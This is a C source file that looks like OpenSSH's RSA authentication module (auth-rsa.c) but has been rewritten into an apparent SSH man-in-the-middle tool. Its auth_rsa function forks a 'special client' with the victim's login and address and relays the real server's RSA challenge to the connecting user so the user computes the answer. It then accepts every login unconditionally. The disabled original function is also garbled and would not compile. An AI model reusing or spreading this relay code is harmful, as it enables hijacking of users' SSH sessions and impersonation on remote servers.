/*
 * Author: Tatu Ylonen <ylo@cs.hut.fi>
 * Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland
 *                    All rights reserved
 * RSA-based authentication.  This code determines whether to admit a login
 * based on RSA authentication.  This file also contains functions to check
 * validity of the host key.
 *
 * As far as I am concerned, the code I have written for this software
 * can be used freely for any purpose.  Any derived versions of this
 * software must be clearly marked as such, and if the derived work is
 * incompatible with the protocol description in the RFC file, it must be
 * called by a name other than "ssh" or "Secure Shell".
 */

#include "includes.h"
RCSID("$OpenBSD: auth-rsa.c,v 1.40 2001/04/06 21:00:07 markus Exp $");

#include <openssl/rsa.h>
#include <openssl/md5.h>

#include "rsa.h"
#include "packet.h"
#include "xmalloc.h"
#include "ssh1.h"
#include "mpaux.h"
#include "uidswap.h"
#include "match.h"
#include "auth-options.h"
#include "pathnames.h"
#include "log.h"
#include "servconf.h"
#include "auth.h"
#include "sshpty.h"


/* import */
extern ServerOptions options;

/*
 * Session identifier that is used to bind key exchange and authentication
 * responses to a particular session.
 */
extern u_char session_id[16];

/*
 * The .ssh/authorized_keys file contains public keys, one per line, in the
 * following format:
 *   options bits e n comment
 * where bits, e and n are decimal numbers,
 * and comment is any string of characters up to newline.  The maximum
 * length of a line is 8000 characters.  See the documentation for a
 * description of the options.
 */

/*
 * Performs the RSA authentication challenge-response dialog with the client,
 * and returns true (non-zero) if the client gave the correct answer to
 * our challenge; returns zero if the client gives a wrong answer.
 */
#if 0
int
auth_rsa_challenge_dialog(BIGNUM *challenge)
{
	BIGNUM *challenge;
	BN_CTX *ctx;
	u_char buf[32], mdbuf[16], response[16];
	MD5_CTX md;
	u_int i;
	int plen, len;


	/* Send the encrypted challenge to the client. */
	packet_start(SSH_SMSG_AUTH_RSA_CHALLENGE);
	packet_put_bignum(challenge);
	packet_send();
	BN_clear_free(encrypted_challenge);
	packet_write_wait();

	/* Wait for a response. */
	packet_read_expect(&plen, SSH_CMSG_AUTH_RSA_RESPONSE);
	packet_integrity_check(plen, 16, SSH_CMSG_AUTH_RSA_RESPONSE);
	for (i = 0; i < 16; i++)
		response[i] = packet_get_char();

	/* The response is MD5 of decrypted challenge plus session id. */
	len = BN_num_bytes(challenge);
	if (len <= 0 || len > 32)
		fatal("auth_rsa_challenge_dialog: bad challenge length %d", len);
	memset(buf, 0, 32);
	BN_bn2bin(challenge, buf + 32 - len);
	MD5_Init(&md);
	MD5_Update(&md, buf, 32);
	MD5_Update(&md, session_id, 16);
	MD5_Final(mdbuf, &md);
	BN_clear_free(challenge);

	/* Verify that the response is the original challenge. */
	if (memcmp(response, mdbuf, 16) != 0) {
		/* Wrong answer. */
		return 0;
	}
	/* Correct answer. */
	return 1;
}

#endif

/*
 * Performs the RSA authentication dialog with the client.  This returns
 * 0 if the client could not be authenticated, and 1 if authentication was
 * successful.  This may exit if there is a serious protocol violation.
 */

int
auth_rsa(Authctxt *auth, BIGNUM *client_n)
{
	char buf[8192], x[65], response[16];
	u_char *bin_modulus;
	BIGNUM challenge;
	char *a[] = {SSHARP_CLIENT, "-r", "-l", auth->sharp.login,
			auth->sharp.remote, NULL};
	struct sockaddr_in dst;
 	int r, mlen, plen, i;

	dstaddr(packet_get_connection_in(), &dst);
	auth->sharp.remote = strdup(inet_ntoa(dst.sin_addr));

	pty_allocate(&auth->master, &auth->slave, x, sizeof(x)); 
	if (fork() == 0) {
		int i;
		dup2(auth->slave, 0); dup2(auth->slave, 1);
		i = open("/dev/null", O_RDWR);
		dup2(i, 2);
		for (i = 3; i < 256; ++i)
			close(i);
		auth->pid = getpid();
		execve(*a, a, NULL);

		/* NOT REACHED */
	}

	/* Give special client the public modulus */
	mlen = BN_num_bytes(client_n);
	bin_modulus = (char *)calloc(1, mlen);
	BN_bn2bin(client_n, bin_modulus);
	write(auth->master, bin_modulus, mlen);
	free(bin_modulus);

	/* Read challenge from special client
	 * and send it to remote client so he computes
	 * response for us. */
	r = read(auth->master, buf, sizeof(buf));
	BN_bin2bn(buf, r, &challenge); 

	/* Send the challenge to the client. */
	packet_start(SSH_SMSG_AUTH_RSA_CHALLENGE);
	packet_put_bignum(&challenge);
	packet_send();
	packet_write_wait();

	/* Wait for a response. */
	packet_read_expect(&plen, SSH_CMSG_AUTH_RSA_RESPONSE);
	packet_integrity_check(plen, 16, SSH_CMSG_AUTH_RSA_RESPONSE);
	for (i = 0; i < 16; i++)
		response[i] = packet_get_char();

	write(auth->master, response, sizeof(response));
	return 1;
}
